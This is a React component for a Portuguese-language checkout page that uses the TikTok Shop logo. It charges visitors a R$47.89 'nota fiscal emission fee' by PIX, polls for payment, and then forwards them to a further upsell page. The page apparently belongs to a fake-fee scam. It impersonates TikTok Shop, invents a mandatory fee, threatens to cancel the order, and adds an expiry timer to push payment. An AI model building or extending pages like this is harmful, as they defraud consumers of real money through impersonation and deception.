import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { Loader2, X, Copy, Clock, ShieldCheck } from "lucide-react";
import tiktokLogo from "@/assets/tiktok-shop.png";

const PINK = "#ff3870";
const AMOUNT = 47.89;

const Upsell1 = () => {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);
  const [showPixModal, setShowPixModal] = useState(false);
  const [pixData, setPixData] = useState<{
    qrCode: string;
    qrImageUrl: string;
    reference: string;
  } | null>(null);
  const [copied, setCopied] = useState(false);
  const [paymentStatus, setPaymentStatus] = useState<'pending' | 'approved'>('pending');

  const handlePayment = async () => {
    if (loading) return;
    setLoading(true);

    try {
      const reference = `upsell1_${Date.now()}_${Math.random().toString(36).substring(2, 8)}`;

      const { data, error } = await supabase.functions.invoke('generate-pix', {
        body: {
          amount: AMOUNT,
          customer_name: 'Cliente Upsell',
          customer_email: 'cliente@upsell.com',
          customer_cpf: '00000000000',
          customer_phone: '00000000000',
          details: 'NF-e Taxa de Emissão',
        },
      });

      if (error) {
        console.error('Erro ao gerar PIX:', error);
        alert('Erro ao gerar PIX. Tente novamente.');
        return;
      }

      if (data?.success && (data?.qr_code || data?.qr_code_base64)) {
        setPixData({
          qrCode: data.qr_code || '',
          qrImageUrl: data.qr_code_base64 || '',
          reference: data.reference || reference,
        });
        setShowPixModal(true);
        
        // Inicia polling para verificar status
        startPolling(data.reference || reference);
      } else {
        alert(data?.error || 'Erro ao gerar PIX. Tente novamente.');
      }
    } catch (err) {
      console.error('Erro:', err);
      alert('Erro ao processar. Tente novamente.');
    } finally {
      setLoading(false);
    }
  };

  const startPolling = (reference: string) => {
    const checkStatus = async () => {
      try {
        const { data, error } = await supabase.functions.invoke('check-pix-status', {
          body: { reference },
        });

        if (!error && data?.success && data?.status === 'approved') {
          setPaymentStatus('approved');
          setTimeout(() => {
            setShowPixModal(false);
            navigate('/up2');
          }, 2000);
          return true;
        }
        return false;
      } catch {
        return false;
      }
    };

    const interval = setInterval(async () => {
      const approved = await checkStatus();
      if (approved) {
        clearInterval(interval);
      }
    }, 5000);

    // Cleanup after 15 minutes
    setTimeout(() => clearInterval(interval), 15 * 60 * 1000);
  };

  const handleCopy = async () => {
    if (!pixData?.qrCode) return;
    try {
      await navigator.clipboard.writeText(pixData.qrCode);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    } catch {
      alert("Não foi possível copiar.");
    }
  };

  return (
    <div className="min-h-screen bg-background flex items-center justify-center p-4">
      <div className="w-full max-w-md bg-card rounded-2xl shadow-card p-8 text-center space-y-6">
        {/* Logo TikTok Shop */}
        <img 
          src={tiktokLogo} 
          alt="TikTok Shop" 
          className="h-10 mx-auto"
        />

        {/* Título */}
        <div>
          <h1 className="text-2xl font-extrabold text-foreground">Parabéns! 🎉</h1>
        </div>

        {/* Descrição */}
        <p className="text-muted-foreground text-sm leading-relaxed">
          Você acabou de garantir seu produto promocional através da TikTok Shop! Para concluir, basta realizar o pagamento da emissão da Nota Fiscal do seu produto.
        </p>

        {/* Card de taxa */}
        <div className="bg-secondary/50 rounded-xl p-6 space-y-2">
          <p className="text-sm text-muted-foreground font-medium">
            NF-e (Taxa de Emissão de Nota Fiscal)
          </p>
          <p className="text-3xl font-extrabold text-foreground">
            R$ {AMOUNT.toFixed(2).replace('.', ',')}
          </p>
          <p className="text-xs text-muted-foreground">
            Taxa única para emissão da nota fiscal
          </p>
        </div>

        {/* Botão de pagamento */}
        <button
          onClick={handlePayment}
          disabled={loading}
          className="w-full font-bold py-4 px-6 rounded-xl text-base transition-colors shadow-lg text-white flex items-center justify-center gap-2 disabled:opacity-70"
          style={{ backgroundColor: PINK }}
        >
          {loading ? (
            <>
              <Loader2 className="w-5 h-5 animate-spin" />
              Gerando PIX...
            </>
          ) : (
            'EFETUAR PAGAMENTO DA TAXA'
          )}
        </button>

        {/* Texto explicativo */}
        <div className="bg-secondary/30 rounded-xl p-4">
          <p className="text-xs text-muted-foreground leading-relaxed">
            Para receber seu produto do TikTok Shop, é necessário pagar a NF-e (Taxa de Emissão de Nota Fiscal). Sem o pagamento, o envio não será autorizado e o pedido será cancelado. Após a confirmação, o produto é enviado imediatamente para o endereço cadastrado.
          </p>
        </div>
      </div>

      {/* PIX Modal */}
      {showPixModal && pixData && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 p-4">
          <div className="bg-white rounded-2xl w-full max-w-sm overflow-hidden shadow-2xl animate-in fade-in zoom-in-95 duration-200 max-h-[90vh] overflow-y-auto">
            {/* Header */}
            <div className="flex items-center justify-between p-4 border-b border-gray-100 sticky top-0 bg-white">
              <h2 className="text-lg font-semibold text-gray-900">Pagamento PIX</h2>
              <button 
                onClick={() => setShowPixModal(false)}
                className="p-1.5 rounded-full hover:bg-gray-100 transition-colors"
              >
                <X className="w-5 h-5 text-gray-500" />
              </button>
            </div>

            {/* Valor */}
            <div
              className="mx-4 mt-4 rounded-2xl py-5 px-4 text-white"
              style={{ background: "linear-gradient(135deg, #ff3870 0%, #ff5a8a 100%)" }}
            >
              <p className="text-center text-white/80 text-xs font-medium uppercase">Valor a pagar</p>
              <p className="text-center text-3xl font-bold mt-1">R$ {AMOUNT.toFixed(2).replace('.', ',')}</p>
            </div>

            {/* QR Code */}
            <div className="p-4">
              <p className="text-center text-gray-600 text-sm font-medium mb-3">
                Escaneie o QR Code com o app do seu banco
              </p>
              <div className="flex justify-center">
                <div className="rounded-xl p-3 border border-gray-100 bg-white shadow-sm">
                  {pixData.qrImageUrl ? (
                    <img
                      src={pixData.qrImageUrl}
                      alt="QR Code PIX"
                      className="w-40 h-40 object-contain"
                    />
                  ) : (
                    <div className="w-40 h-40 flex items-center justify-center">
                      <Loader2 className="w-6 h-6 animate-spin text-gray-300" />
                    </div>
                  )}
                </div>
              </div>

              {/* Divider */}
              <div className="flex items-center gap-3 my-4">
                <div className="h-px flex-1 bg-gray-100" />
                <span className="text-gray-400 text-xs">ou copie o código</span>
                <div className="h-px flex-1 bg-gray-100" />
              </div>

              {/* Copy button */}
              <button
                onClick={handleCopy}
                className="w-full py-3.5 rounded-xl font-semibold text-sm text-white transition-all flex items-center justify-center gap-2 active:scale-[0.98]"
                style={{ backgroundColor: copied ? "#2DB573" : PINK }}
              >
                <Copy className="w-4 h-4" />
                {copied ? "Código copiado!" : "Copiar código PIX"}
              </button>

              {pixData.qrCode && (
                <p className="text-[10px] text-center text-gray-400 mt-3 break-all line-clamp-2 px-2">
                  {pixData.qrCode}
                </p>
              )}
            </div>

            {/* Timer */}
            <div className="mx-4 mb-3 rounded-xl p-3 bg-amber-50 border border-amber-100">
              <div className="flex items-center justify-center gap-2 text-amber-700">
                <Clock className="w-4 h-4" />
                <span className="text-sm font-medium">O PIX expira em 14 minutos</span>
              </div>
            </div>

            {/* Status */}
            {paymentStatus === 'approved' ? (
              <div className="mx-4 mb-4 rounded-xl p-3 bg-emerald-50 border border-emerald-200">
                <div className="flex items-center justify-center gap-2 text-emerald-600">
                  <ShieldCheck className="w-4 h-4" />
                  <span className="font-semibold text-sm">Pagamento confirmado!</span>
                </div>
              </div>
            ) : (
              <div className="mx-4 mb-4 rounded-xl p-3 bg-blue-50 border border-blue-100">
                <div className="flex items-center justify-center gap-2 text-blue-600">
                  <Loader2 className="w-4 h-4 animate-spin" />
                  <span className="text-sm font-medium">Aguardando pagamento...</span>
                </div>
              </div>
            )}
          </div>
        </div>
      )}
    </div>
  );
};

export default Upsell1;
